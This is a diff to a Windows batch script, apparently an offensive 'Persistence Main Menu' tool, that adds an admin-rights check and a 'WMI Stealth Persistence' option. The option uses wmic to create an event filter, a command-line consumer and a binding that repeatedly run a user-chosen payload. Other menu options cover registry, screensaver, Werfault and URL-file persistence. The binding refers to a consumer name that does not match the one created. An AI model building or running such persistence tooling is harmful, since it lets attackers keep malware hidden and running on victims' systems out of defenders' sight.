@@ -9,16 +9,17 @@ echo ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶
 echo ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
 echo ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
 echo ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
-echo ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕      By Eyna.
+echo ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕      By Eyna Version 1.1.
 echo ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
 echo ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 echo ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
 echo ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
 echo ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
 echo ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣
+echo ==============================
 
-
-
+echo [+] Current user privilege: && whoami /groups | find "S-1-16-12288" >nul && echo Admin || echo Not admin
+ 
 echo ==============================
 echo     Persistence Main Menu
 echo ==============================
@@ -28,7 +29,7 @@ echo 3. Registry-ScreenSaver (HKCU)
 echo 4. Url-File Creation + DLL URL Exec Help (.URL)
 echo 5. Registry-Werfault (Admin - HKLM)
 echo 6. Bring Your Own Protocol Handler + URL-File 
-echo 7.
+echo 7. WMI Stealth Persistence
 echo 8. Guides For Persistence
 echo 9. Exit
 echo ==============================
@@ -70,6 +71,8 @@ echo Press Enter to go back to menu...
 pause > nul
 goto menu
 
+
+
 :option2
 cls
 echo You selected Option Winlogon Registry Add.
@@ -83,6 +86,8 @@ reg query HKEY_CURRENT_USER\Environment /v %RegName%
 echo Press Enter to go back to menu...
 pause > nul
 goto menu
+
+
 
 :option3
 cls
@@ -98,6 +103,9 @@ reg query "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut"
 echo Press any key to return to the menu...
 pause > nul
 goto menu
+
+
+
 
 :option4
 cls
@@ -116,6 +124,10 @@ echo ==============================
 echo Press any key to return to the menu...
 pause > nul
 goto menu
+
+
+
+
 
 :option5
 cls
@@ -197,7 +209,17 @@ goto menu
 
 :option7
 cls
-echo You selected Option 7.
+echo You selected WMI Stealth Persistence.
+echo ==============================
+set /p WON="WMI Object Name: "
+set /p PathExec="Payload Full Path: "
+set /p Delay="WMI Execution Delay (minutes): "
+set /a Delay=%Delay% * 60
+echo ==============================
+wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="%WON%", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN %Delay% WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="%WON%", CommandLineTemplate="%PathExec%"
+wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"%WON%\"", Consumer="CommandLineEventConsumer.Name=\"SecurityConsumer\""
+echo ==============================
 echo Press any key to return to the menu...
 pause > nul
 goto menu
